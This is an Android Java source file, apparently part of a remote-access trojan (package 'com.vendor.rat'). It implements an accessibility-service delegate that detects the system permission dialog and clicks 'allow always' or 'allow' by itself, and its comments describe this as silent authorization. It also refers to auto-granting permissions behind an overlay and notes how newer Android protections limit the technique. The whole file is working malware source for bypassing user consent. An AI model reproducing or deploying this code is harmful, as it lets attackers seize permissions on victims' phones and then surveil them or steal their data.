package com.vendor.rat.auto.engine.vendor;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.engine.AutoEngine;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.auto.util.GkdSelectorHelper;

import java.util.ArrayList;
import java.util.List;

/**
 * 系统权限对话框自动授权代理
 *
 * 基于 vendor o/l.java (GrantPermissionsDelegate) 逆向复刻。
 * 监听 Android PermissionController 弹出的运行时权限对话框 (GrantPermissionsActivity)，
 * 自动点击"允许"按钮完成静默授权。
 *
 * 监听的包名:
 *   - com.android.permissioncontroller (Android 10+)
 *   - com.android.packageinstaller (旧版 Android)
 *
 * 监听的 Activity:
 *   - com.android.packageinstaller.permission.ui.GrantPermissionsActivity
 *   - com.android.permissioncontroller.permission.ui.GrantPermissionsActivity
 *
 * 按钮点击优先级 (使用 GKD Selector 按 resource ID 后缀匹配):
 *   1. permission_allow_always_button — 始终允许
 *   2. permission_allow_button — 允许
 *   3. permission_allow_foreground_only_button — 仅使用时允许
 *   4. permission_allow_one_time_button — 仅本次
 *
 * 注意: Android 16+ 引入 accessibilityDataSensitive 属性，
 * PermissionController 的节点树可能对无障碍服务不可见，
 * 此时 k() 返回 null 或空节点树，需要使用坐标点击等替代方案。
 *
 * @see com.vendor.rat.auto.engine.PermissionAutoGrantEngine 遮罩期间的权限自动授予
 * @see OppoPermissionEngine OPPO 专用权限管理引擎
 */
public class GrantPermissionsDelegate extends AutoEngine {

    private static final String TAG = "GrantPermDelegate";

    private static final String PERMISSION_CONTROLLER = "com.android.permissioncontroller";
    private static final String PACKAGE_INSTALLER = "com.android.packageinstaller";

    // GrantPermissionsActivity 的两种完整类名 (旧版 + 新版)
    private static final String GRANT_ACTIVITY_OLD =
            "com.android.packageinstaller.permission.ui.GrantPermissionsActivity";
    private static final String GRANT_ACTIVITY_NEW =
            "com.android.permissioncontroller.permission.ui.GrantPermissionsActivity";

    // 允许按钮 resource ID 后缀 — 按优先级排列
    private static final String[] ALLOW_BUTTON_SELECTORS = {
        "[id$=\"permission_allow_always_button\"]",
        "[id$=\"permission_allow_button\"]",
        "[id$=\"permission_allow_foreground_only_button\"]",
        "[id$=\"permission_allow_one_time_button\"]",
    };

    public GrantPermissionsDelegate() {
        super(buildMatchers(), PERMISSION_CONTROLLER);
    }

    private static List<WindowMatcher> buildMatchers() {
        List<WindowMatcher> list = new ArrayList<>();

        // permissioncontroller — GrantPermissionsActivity (新版)
        list.add(new WindowMatcher(PERMISSION_CONTROLLER, GRANT_ACTIVITY_NEW)
                .addEventType(32)       // TYPE_WINDOW_STATE_CHANGED
                .addEventType(16384));  // TYPE_WINDOW_CONTENT_CHANGED

        // packageinstaller — GrantPermissionsActivity (旧版)
        list.add(new WindowMatcher(PERMISSION_CONTROLLER, GRANT_ACTIVITY_OLD)
                .addEventType(32)
                .addEventType(16384));

        // packageinstaller 包名匹配 (部分旧设备)
        list.add(new WindowMatcher(PACKAGE_INSTALLER, GRANT_ACTIVITY_OLD)
                .addEventType(32)
                .addEventType(16384));

        return list;
    }

    @Override
    protected void onEventSafe(AccessibilityEvent event, String packageName,
                                String className) {
        // 仅处理 GrantPermissionsActivity
        if (className == null) return;
        if (!className.contains("GrantPermissionsActivity")) return;

        Log.d(TAG, "权限对话框检测: pkg=" + packageName + " cls=" + className);

        sleep(500); // 等待 UI 渲染完成

        activateRoot();
        UiNode root = k();

        if (root == null) {
            Log.w(TAG, "root is null — Android 16+ accessibilityDataSensitive 可能阻止了节点树访问");
            return;
        }

        // 按优先级尝试各个允许按钮
        for (String selector : ALLOW_BUTTON_SELECTORS) {
            UiNode button = GkdSelectorHelper.findOne(root, selector);
            if (button != null && button.isClickable()) {
                button.click();
                Log.d(TAG, "已点击允许按钮: " + selector);
                return;
            }
        }

        Log.d(TAG, "未找到任何允许按钮");
    }

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        // 由 onEventSafe 处理
    }

    @Override
    public void execute() {
        // 被动代理，由事件驱动
    }

    // ============ equals/hashCode ============

    @Override
    public boolean equals(Object obj) {
        return obj instanceof GrantPermissionsDelegate;
    }

    @Override
    public int hashCode() {
        return GrantPermissionsDelegate.class.getName().hashCode();
    }
}
